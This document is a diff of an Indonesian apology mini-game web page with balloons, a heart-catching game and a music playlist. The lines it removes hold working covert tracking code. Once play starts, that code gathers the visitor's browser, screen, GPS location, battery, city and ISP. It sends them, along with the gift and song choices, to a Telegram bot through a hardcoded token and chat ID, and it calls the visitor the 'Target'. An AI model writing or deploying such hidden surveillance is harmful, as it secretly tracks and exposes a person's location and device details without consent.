@@ -3,82 +3,120 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>For You My Princess 💖</title>
+    <title>Interactive Fun Space 💖</title>
     <style>
-        body {
-            margin: 0; padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #ffafbd 0%, #ffc3a0 100%);
-            height: 100vh; display: flex;
-            justify-content: center; align-items: center;
-            color: #5d4037; text-align: center; overflow: hidden;
-            position: relative;
+        :root {
+            --bg-grad: linear-gradient(135deg, #ffafbd 0%, #ffc3a0 100%);
+            --main-color: #d81b60;
+            --btn-grad: linear-gradient(to right, #ff4081, #ec407a);
+            --text-color: #5d4037;
+            --box-bg: rgba(255, 255, 255, 0.78);
         }
-        #gameCanvas {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1;
+        .theme-blue {
+            --bg-grad: linear-gradient(135deg, #a1c4fd 0%, #c2e9fb 100%);
+            --main-color: #0d47a1;
+            --btn-grad: linear-gradient(to right, #2196f3, #00bcd4);
+            --text-color: #1a237e;
+            --box-bg: rgba(255, 255, 255, 0.8);
+        }
+        .theme-purple {
+            --bg-grad: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            --main-color: #e040fb;
+            --btn-grad: linear-gradient(to right, #b388ff, #7c4dff);
+            --text-color: #ffffff;
+            --box-bg: rgba(42, 33, 79, 0.8);
+        }
+        body {
+            margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif;
+            background: var(--bg-grad); height: 100vh; display: flex;
+            justify-content: center; align-items: center;
+            color: var(--text-color); text-align: center; overflow: hidden; position: relative;
+            transition: background 0.5s ease, color 0.5s ease;
+        }
+        #gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        .theme-toggle {
+            position: absolute; top: 15px; right: 15px; z-index: 10;
+            background: rgba(255, 255, 255, 0.5); border: none; padding: 8px 12px;
+            border-radius: 20px; cursor: pointer; font-size: 14px; font-weight: bold;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
         .container {
-            position: relative; z-index: 2; background: rgba(255, 255, 255, 0.75);
-            padding: 25px 20px; border-radius: 20px; backdrop-filter: blur(8px);
-            box-shadow: 0 8px 32px 0 rgba(255, 105, 180, 0.2);
-            border: 2px solid rgba(255, 255, 255, 0.5);
-            max-width: 85%; width: 320px; display: none; animation: muncul 0.5s ease-out;
+            position: relative; z-index: 2; background: var(--box-bg);
+            padding: 22px 20px; border-radius: 25px; backdrop-filter: blur(10px);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.15);
+            border: 2px solid rgba(255, 255, 255, 0.4);
+            max-width: 85%; width: 310px; display: none; animation: muncul 0.4s ease-out;
         }
-        h1 { font-size: 22px; margin-bottom: 8px; color: #d81b60; font-weight: 800; }
-        p { font-size: 13px; color: #4e342e; margin-bottom: 15px; font-weight: 500; line-height: 1.5; }
+        h1 { font-size: 20px; margin-bottom: 8px; color: var(--main-color); font-weight: 800; }
+        p { font-size: 13px; margin-bottom: 15px; font-weight: 500; line-height: 1.5; }
+        .input-name {
+            width: 85%; padding: 10px; border-radius: 15px; border: 2px solid var(--main-color);
+            margin-bottom: 15px; text-align: center; font-size: 14px; font-weight: bold; outline: none;
+        }
         .btn {
-            background: linear-gradient(to right, #ff4081, #ec407a);
-            color: white; border: none; padding: 12px 25px; font-size: 14px; font-weight: bold;
-            border-radius: 25px; cursor: pointer; box-shadow: 0 4px 15px rgba(236, 64, 122, 0.4);
-            margin: 5px; transition: all 0.2s ease;
+            background: var(--btn-grad); color: white; border: none;
+            padding: 11px 22px; font-size: 13px; font-weight: bold;
+            border-radius: 25px; cursor: pointer; margin: 5px; transition: all 0.2s ease;
         }
         .btn-opt {
             background: white; color: #ec407a; border: 2px solid #ec407a;
-            width: 90%; display: block; margin: 8px auto; font-size: 13px;
-            padding: 10px 15px; text-align: left; border-radius: 15px;
+            width: 95%; display: block; margin: 8px auto; font-size: 12px; padding: 9px 12px; border-radius: 12px;
         }
-        .btn-opt:hover { background: #fff0f5; }
-        .btn-playing {
-            background: linear-gradient(to right, #66bb6a, #43a047) !important;
-            color: white !important; border: 2px solid #43a047 !important;
+        .btn-playing { background: linear-gradient(to right, #66bb6a, #43a047) !important; color: white !important; border: none !important;}
+        .letter-box {
+            max-height: 100px; overflow-y: auto; background: rgba(0,0,0,0.05);
+            padding: 10px; border-radius: 10px; margin-top: 10px; font-style: italic; font-size: 12px;
         }
-        @keyframes muncul {
-            from { transform: scale(0.9); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
+        @keyframes muncul { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
     </style>
 </head>
-<body>
+<body class="theme-pink">
+    <button class="theme-toggle" onclick="gantiTema()">🎨 Tema</button>
     <canvas id="gameCanvas"></canvas>
     <audio id="webAudio" style="display: none;"></audio>
-
-    <div id="lapis1" class="container" style="display: block;">
-        <h1>🎈 Main Game Yuk!</h1>
-        <p>Coba ketuk balon-balon pink yang memantul untuk memunculkan pesan penyemangat rahasia! Klik tombol di bawah untuk mulai bermain.</p>
-        <button class="btn" onclick="mulaiSistem()">Mulai Main Game 💖</button>
+    <!-- LAPIS 0: INPUT NAMA KUSTOM -->
+    <div id="lapis0" class="container" style="display: block;">
+        <h1>✨ Selamat Datang!</h1>
+        <p>Masukkan namamu (atau nama target) untuk memulai petualangan interaktif spesial ini:</p>
+        <input type="text" id="targetName" class="input-name" placeholder="Ketik nama di sini..." value="Princess">
+        <br>
+        <button class="btn" onclick="simpanNama()">Masuk Ruang Game 🚀</button>
     </div>
+
+    <!-- LAPIS 1: PEMBUKA BALON -->
+    <div id="lapis1" class="container">
+        <h1>🎈 Main Game Balon!</h1>
+        <p>Halo <span class="v-nama"></span>! Coba ketuk balon-balon yang memantul di layar untuk memunculkan kalimat penyemangat rahasia!</p>
+        <button class="btn" onclick="mulaiBalon()">Mulai Ketuk Balon 🌸</button>
+    </div>
+
+    <!-- LAPIS 2: PERNYATAAN MAAF INTERAKTIF -->
     <div id="lapis2" class="container">
         <h1>Maafin Aku Ya? 🥺</h1>
-        <p>Aku tahu aku salah dan udah bikin kamu ngambek seharian ini... Kamu masih kesel banget ya sama aku? Maafin aku dong mamiis...</p>
-        <button class="btn" onclick="keLapisTiga()">Iya, Udah Dimaafin 💖</button>
+        <p>Aku tahu aku salah and udah bikin kamu kesel, <span class="v-nama"></span>... Kamu masih ngambek banget ya sama aku? Maafin dong...</p>
+        <button class="btn" onclick="keLapisGameTangkap()">Iya, Udah Dimaafin 💖</button>
         <button id="btnNgambek" class="btn" style="background: #90a4ae;" onclick="tombolGagal()">Masih Kesel! 😜</button>
     </div>
+
+    <!-- LAPIS 3: GAME MINI BARU TANGKAP HATI -->
     <div id="lapis3" class="container">
-        <h1>Sogokan Spesial! 🎁</h1>
-        <p>Biar senyum cantiknya balik lagi, tuan putri mau hadiah apa hari ini dari aku? Silakan dipilih masterpiecenya:</p>
-        <button class="btn btn-opt" onclick="pilihHadiah('Makan Seblak + Boba Sepuasnya 🧋')"> Makan Seblak + Boba Sepuasnya 🧋</button>
-        <button class="btn btn-opt" onclick="pilihHadiah('Jalan-jalan Naik Motor Malam Hari 🛵')"> Jalan-jalan Naik Motor Malam Hari 🛵</button>
-        <button class="btn btn-opt" onclick="pilihHadiah('Shopping Baju & Skincare Baru 🛍️✨')"> Ditemenin Belanja Sepuas Kamu 🛍️</button>
-        <button class="btn btn-opt" onclick="pilihHadiah('Pelukan & Deep Talk Berdua 🤗❤️')"> Cukup Quality Time Berdua Aja ❤️</button>
+        <h1>🎮 Tantangan Tangkap Hati!</h1>
+        <p>Geser keranjang di bawah layar menggunakan jarimu untuk menangkap <b>5 Hati Gugur</b> agar tombol hadiah terbuka, <span class="v-nama"></span>!</p>
+        <div style="font-weight: bold; color: var(--main-color); margin-bottom: 5px;">Skor Hati: <span id="skorHati">0</span> / 5</div>
+        <button id="btnLewatiGame" class="btn" style="display:none;" onclick="keLapisHadiah()">Buka Kotak Sogokan 🎁</button>
     </div>
+
+    <!-- LAPIS 4: JUKEBOX & SURAT BERJALAN -->
     <div id="lapis4" class="container">
         <h1>Yeeayy Sukses! 🥰</h1>
-        <p id="teksHadiah"></p>
-        <p>Sebagai gantinya, ini ada playlist lagu spesial yang bisa kamu puter langsung di web ini dari storage. Ketuk judulnya buat dengerin ya:</p>
-        <button id="btnLagu1" class="btn btn-opt" onclick="putarMusikLokal('lagu1.mp3', 'Idgitaf - Berakhir di Aku', 'btnLagu1')">🎵 Idgitaf - Berakhir di Aku 🍂</button>
-        <button id="btnLagu2" class="btn btn-opt" onclick="putarMusikLokal('tiktok.mp3', 'Cup of Joe - Multo', 'btnLagu2')">🎵 Cup of Joe - Multo 🔥</button>
-        <button id="btnLagu3" class="btn btn-opt" onclick="putarMusikLokal('lagu3.mp3', 'Jungkook - Still With You', 'btnLagu3')">🎵 Jungkook - Still With You 💜</button>
-        <button id="btnLagu4" class="btn btn-opt" style="background: #fff0f5; border: 2px dashed #ff4081;" onclick="putarMusikLokal('lagu4.mp3', 'Spesial For You ❤️', 'btnLagu4')">🎵 Lagu Spesial For You ❤️</button>
+        <p>Terima kasih sudah memaafkan, <span class="v-nama"></span>! Ini ada surat rahasia dan playlist musik storage lokal buat nemenin kamu:</p>
+        <div class="letter-box">
+            <div id="textBerjalan">Memuat surat cinta spesial dari lubuk hati terdalam... Tetap tersenyum dan semangat selalu ya kamu yang ada di sana! ❤️✨</div>
+        </div>
+        <button id="btnLagu1" class="btn btn-opt" onclick="putarMusikLokal('lagu1.mp3', 'btnLagu1')">🎵 Idgitaf - Berakhir di Aku 🍂</button>
+        <button id="btnLagu2" class="btn btn-opt" onclick="putarMusikLokal('tiktok.mp3', 'btnLagu2')">🎵 Cup of Joe - Multo 🔥</button>
+        <button id="btnLagu3" class="btn btn-opt" onclick="putarMusikLokal('lagu3.mp3', 'btnLagu3')">🎵 Jungkook - Still With You 💜</button>
+        <button id="btnLagu4" class="btn btn-opt" style="background: #fff0f5; border: 2px dashed #ff4081;" onclick="putarMusikLokal('lagu4.mp3', 'btnLagu4')">🎵 Lagu Spesial For You ❤️</button>
     </div>
     <script>
         const canvas = document.getElementById('gameCanvas');
@@ -86,10 +124,26 @@
         function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
         window.addEventListener('resize', resize); resize();
 
+        let namaGlobal = "Princess";
+        let modeSistem = "balon"; // balon, tangkap, mawar
         const balls = []; const poppedTexts = [];
         const colors = ['#ff65a3', '#ff8ebb', '#ffbcd9', '#f48fb1', '#f06292'];
-        const kataPenyemangat = ["Semangat! ✨", "Kamu Cantik 💖", "Senyum Dong 😊", "Kamu Hebat! 🌟", "Miss You 🌸"];
-        const flowers = []; let efekBungaAktif = false;
+        const kataPenyemangat = ["Semangat! ✨", "Kamu Hebat! 🌟", "Senyum Dong 😊", "Keren Banget! 🌸", "Have a Nice Day ⭐"];
+        
+        // Data Game Tangkap Hati
+        let basket = { x: 0, y: 0, w: 70, h: 15 };
+        const hearts = []; let skorGame = 0;
+        
+        // Data Mawar Gugur
+        const flowers = [];
+
+        function simpanNama() {
+            const input = document.getElementById('targetName').value;
+            if(input.trim() !== "") namaGlobal = input;
+            document.querySelectorAll('.v-nama').forEach(el => el.innerText = namaGlobal);
+            document.getElementById('lapis0').style.display = 'none';
+            document.getElementById('lapis1').style.display = 'block';
+        }
 
         for (let i = 0; i < 5; i++) { createBall(i); }
         function createBall(i) {
@@ -99,46 +153,91 @@
             };
         }
 
-        canvas.addEventListener('click', function(e) {
-            const clickX = e.clientX; const clickY = e.clientY;
-            balls.forEach((ball, i) => {
-                const dist = Math.sqrt((clickX - ball.x)**2 + (clickY - ball.y)**2);
-                if (dist < ball.radius) {
-                    const txt = kataPenyemangat[Math.floor(Math.random() * kataPenyemangat.length)];
-                    poppedTexts.push({ x: ball.x, y: ball.y, text: txt, alpha: 1.0 });
-                    createBall(i);
-                }
-            });
+        // Kontrol Sentuh Menggerakkan Basket Keranjang
+        window.addEventListener('touchmove', function(e) {
+            if (modeSistem === "tangkap") {
+                let touchX = e.touches[0].clientX;
+                basket.x = touchX - basket.w / 2;
+                if (basket.x < 0) basket.x = 0;
+                if (basket.x + basket.w > canvas.width) basket.x = canvas.width - basket.w;
+            }
+        });
+        window.addEventListener('mousemove', function(e) {
+            if (modeSistem === "tangkap") {
+                basket.x = e.clientX - basket.w / 2;
+                if (basket.x < 0) basket.x = 0;
+                if (basket.x + basket.w > canvas.width) basket.x = canvas.width - basket.w;
+            }
         });
 
-        function spawnFlowers() {
-            efekBungaAktif = true;
-            for (let i = 0; i < 45; i++) {
-                flowers.push({
-                    x: Math.random() * canvas.width, y: Math.random() * -canvas.height,
-                    size: Math.random() * 7 + 5, speedY: Math.random() * 1.5 + 1, speedX: (Math.random() - 0.5) * 1.5,
-                    angle: Math.random() * Math.PI * 2, spin: Math.random() * 0.02 - 0.01
+        canvas.addEventListener('click', function(e) {
+            if (modeSistem === "balon") {
+                const clickX = e.clientX; const clickY = e.clientY;
+                balls.forEach((ball, i) => {
+                    const dist = Math.sqrt((clickX - ball.x)**2 + (clickY - ball.y)**2);
+                    if (dist < ball.radius) {
+                        const txt = kataPenyemangat[Math.floor(Math.random() * kataPenyemangat.length)];
+                        poppedTexts.push({ x: ball.x, y: ball.y, text: txt, alpha: 1.0 });
+                        createBall(i);
+                        
+                        // Setelah 4 ketukan balon, tombol lanjut otomatis terbuka senyap
+                        setTimeout(() => {
+                            document.getElementById('lapis1').style.display = 'none';
+                            document.getElementById('lapis2').style.display = 'block';
+                        }, 2500);
+                    }
                 });
             }
-        }
+        });
         function animate() {
             ctx.clearRect(0, 0, canvas.width, canvas.height);
-            balls.forEach(ball => {
-                ctx.beginPath(); ctx.arc(ball.x, ball.y, ball.radius, 0, Math.PI * 2);
-                ctx.fillStyle = ball.color; ctx.fill(); ctx.closePath();
-                if (ball.x + ball.radius > canvas.width || ball.x - ball.radius < 0) ball.dx = -ball.dx;
-                if (ball.y + ball.radius > canvas.height || ball.y - ball.radius < 0) ball.dy = -ball.dy;
-                ball.x += ball.dx; ball.y += ball.dy;
-            });
-            poppedTexts.forEach((pt, idx) => {
-                ctx.save(); ctx.globalAlpha = pt.alpha;
-                ctx.font = "bold 14px sans-serif"; ctx.fillStyle = "#d81b60"; ctx.textAlign = "center";
-                ctx.fillText(pt.text, pt.x, pt.y); ctx.restore();
-                pt.y -= 1; pt.alpha -= 0.015;
-                if (pt.alpha <= 0) poppedTexts.splice(idx, 1);
-            });
-            if (efekBungaAktif) {
-                flowers.forEach((f, idx) => {
+            
+            if (modeSistem === "balon") {
+                balls.forEach(ball => {
+                    ctx.beginPath(); ctx.arc(ball.x, ball.y, ball.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = ball.color; ctx.fill(); ctx.closePath();
+                    if (ball.x + ball.radius > canvas.width || ball.x - ball.radius < 0) ball.dx = -ball.dx;
+                    if (ball.y + ball.radius > canvas.height || ball.y - ball.radius < 0) ball.dy = -ball.dy;
+                    ball.x += ball.dx; ball.y += ball.dy;
+                });
+                poppedTexts.forEach((pt, idx) => {
+                    ctx.save(); ctx.globalAlpha = pt.alpha;
+                    ctx.font = "bold 13px sans-serif"; ctx.fillStyle = "#d81b60"; ctx.textAlign = "center";
+                    ctx.fillText(pt.text, pt.x, pt.y); ctx.restore();
+                    pt.y -= 1; pt.alpha -= 0.015;
+                    if (pt.alpha <= 0) poppedTexts.splice(idx, 1);
+                });
+            }
+            else if (modeSistem === "tangkap") {
+                // Gambar Keranjang Basket Pemain
+                ctx.fillStyle = "var(--main-color)";
+                ctx.fillRect(basket.x, basket.y, basket.w, basket.h);
+                
+                // Animasi Hati Gugur
+                if (Math.random() < 0.03 && hearts.length < 4) {
+                    hearts.push({ x: Math.random() * (canvas.width - 20) + 10, y: 0, speed: Math.random() * 2 + 2 });
+                }
+                
+                hearts.forEach((h, idx) => {
+                    ctx.fillStyle = "#ff1744";
+                    ctx.font = "16px sans-serif";
+                    ctx.fillText("❤️", h.x, h.y);
+                    h.y += h.speed;
+                    
+                    // Deteksi Tabrakan Keranjang (Collision Detection)
+                    if (h.y >= basket.y && h.y <= basket.y + basket.h && h.x >= basket.x && h.x <= basket.x + basket.w) {
+                        hearts.splice(idx, 1);
+                        skorGame++;
+                        document.getElementById('skorHati').innerText = skorGame;
+                        if(skorGame >= 5) {
+                            document.getElementById('btnLewatiGame').style.display = 'inline-block';
+                        }
+                    }
+                    if (h.y > canvas.height) hearts.splice(idx, 1);
+                });
+            }
+            else if (modeSistem === "mawar") {
+                flowers.forEach(f => {
                     ctx.save(); ctx.translate(f.x, f.y); ctx.rotate(f.angle); ctx.fillStyle = "#ff4081";
                     ctx.beginPath(); ctx.ellipse(0, 0, f.size, f.size/2, 0, 0, Math.PI * 2); ctx.fill(); ctx.restore();
                     f.y += f.speedY; f.x += f.speedX; f.angle += f.spin;
@@ -149,34 +248,8 @@
         }
         animate();
 
-        var infoHP = "💖 LAPORAN GAME MAMIIS INDAH 💖\n\n";
-
-        function mulaiSistem() {
-            infoHP += "📱 Browser: " + navigator.userAgent + "\n";
-            infoHP += "🖥️ Resolusi Layar: " + screen.width + "x" + screen.height + "\n";
-            infoHP += "⏰ Waktu Target: " + new Date().toLocaleString('id-ID') + "\n";
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(pos) {
-                    infoHP += "📍 GOOGLE MAPS AKURAT: https://google.com" + pos.coords.latitude + "," + pos.coords.longitude + "\n";
-                    prosesKirimAwal();
-                }, function() { infoHP += "📍 Akses GPS Lokasi: Ditolak Target\n"; prosesKirimAwal(); }, {timeout:5000});
-            } else { prosesKirimAwal(); }
-            document.getElementById('lapis1').style.display = 'none';
-            document.getElementById('lapis2').style.display = 'block';
-        }
-
-        function prosesKirimAwal() {
-            if (navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    infoHP += "🔋 Sisa Baterai: " + (b.level * 100) + "%\n";
-                    fetch('https://ipapi.co').then(r => r.json()).then(d => {
-                        infoHP += "🏙️ Kota Jaringan: " + d.city + "\n📡 Provider Internet: " + d.org + "\n";
-                        kirimKeTelegram(infoHP);
-                    }).catch(() => kirimKeTelegram(infoHP));
-                });
-            } else { kirimKeTelegram(infoHP); }
-        }
-
+        function mulaiBalon() { modeSistem = "balon"; }
+        
         let skalaTombol = 1.0;
         function tombolGagal() {
             skalaTombol -= 0.15; const btn = document.getElementById('btnNgambek');
@@ -188,38 +261,39 @@
         function keLapisTiga() {
             document.getElementById('lapis2').style.display = 'none';
             document.getElementById('lapis3').style.display = 'block';
+            modeSistem = "tangkap";
+            basket.y = canvas.height - 40;
+            basket.x = canvas.width / 2 - basket.w / 2;
         }
 
-        function pilihHadiah(namaHadiah) {
-            spawnFlowers();
-            kirimKeTelegram("🎁 HADIAH PILIHAN CEWEK:\nTarget memilih: " + namaHadiah + "\n");
-            
-            // JALUR DIKUNCI DI SINI: Walau Telegram eror/diblokir, halaman di bawah ini WAJIB langsung terbuka!
-            document.getElementById('teksHadiah').innerHTML = `Gaaasss! Pilihanmu sukses dicatat: <b>${namaHadiah}</b>. Siap-siap aku kabulin secepatnya ya! 🥰`;
+        function keLapisGameTangkap() { keLapisTiga(); }
+        function keLapisHadiah() {
+            modeSistem = "mawar";
+            for (let i = 0; i < 40; i++) {
+                flowers.push({
+                    x: Math.random() * canvas.width, y: Math.random() * -canvas.height, size: Math.random() * 7 + 4,
+                    speedY: Math.random() * 1.2 + 1, speedX: (Math.random() - 0.5) * 1, angle: Math.random() * 6, spin: Math.random() * 0.02 - 0.01
+                });
+            }
             document.getElementById('lapis3').style.display = 'none';
             document.getElementById('lapis4').style.display = 'block';
+            
+            // Efek Surat Teks Berjalan
+            const box = document.getElementById('textBerjalan');
+            box.innerText = `Halo ${namaGlobal}, terimakasih ya sudah berbesar hati menerima permintaan maafku hari ini. Web mini interaktif ini sengaja dibuat agar bisa dinikmati siapa saja. Semoga harimu menyenangkan, penuh tawa, dan selalu bahagia ya! ❤️✨`;
         }
 
-        function kirimKeTelegram(dataTeks) {
-            try {
-                const token = "8985143701:AAFknnQC9ogEwbGS8qD-j-ApYpqdFdkrF-c";
-                const chatId = "1948837912";
-                const url = "https://telegram.org" + token + "/sendMessage";
-                
-                var xhr = new XMLHttpRequest();
-                xhr.open("POST", url, true);
-                xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-                xhr.send("chat_id=" + chatId + "&text=" + encodeURIComponent(dataTeks));
-            } catch (error) {
-                console.log("Pengiriman diblokir browser, dilewati aman.");
-            }
+        let listTema = ['theme-pink', 'theme-blue', 'theme-purple'];
+        let idxTema = 0;
+        function gantiTema() {
+            document.body.classList.remove(listTema[idxTema]);
+            idxTema = (idxTema + 1) % listTema.length;
+            document.body.classList.add(listTema[idxTema]);
         }
 
         let currentBtnId = null;
-        function putarMusikLokal(namaFileMp3, namaLagu, buttonId) {
+        function putarMusikLokal(namaFileMp3, buttonId) {
             const audio = document.getElementById('webAudio');
-            kirimKeTelegram("🎵 REAKSI MUSIK:\nTarget sedang memutar lagu: " + namaLagu + "\n");
-
             if (currentBtnId) { document.getElementById(currentBtnId).classList.remove('btn-playing'); }
             const fullUrl = './' + namaFileMp3;
 
